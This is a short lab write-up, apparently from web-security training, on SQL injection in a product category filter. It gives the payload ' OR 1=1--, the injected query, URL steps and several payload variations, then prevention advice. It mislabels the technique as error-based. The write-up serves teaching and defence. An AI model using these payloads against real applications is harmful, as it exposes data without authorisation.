# 🧪 Lab: SQL Injection - Hidden Data

## 🎯 Goal
Retrieve hidden products by exploiting SQL injection in the category parameter.

## 🔍 Vulnerability Type
Error-based SQL Injection

## ⚙️ Payload Used
' OR 1=1--

## 🧠 Explanation
The application directly includes user input in the SQL query.

Original query:
SELECT * FROM products WHERE category = 'input'

Injected query:
SELECT * FROM products WHERE category = '' OR 1=1--'

The condition becomes always true, so all products are returned.

## 💥 Exploitation Steps
1. Open the lab
2. Select a category filter
3. Modify URL:
   category=' OR 1=1--
4. Observe all products including hidden ones

## 🔁 Payload Variations
- ' OR '1'='1
- ' OR 1=1#
- ' OR 1=1/*

## 🌍 Real-World Impact
- Authentication bypass
- Data leakage
- Database exposure

## 🛡️ Prevention
- Prepared statements
- Parameterized queries
- Input validation
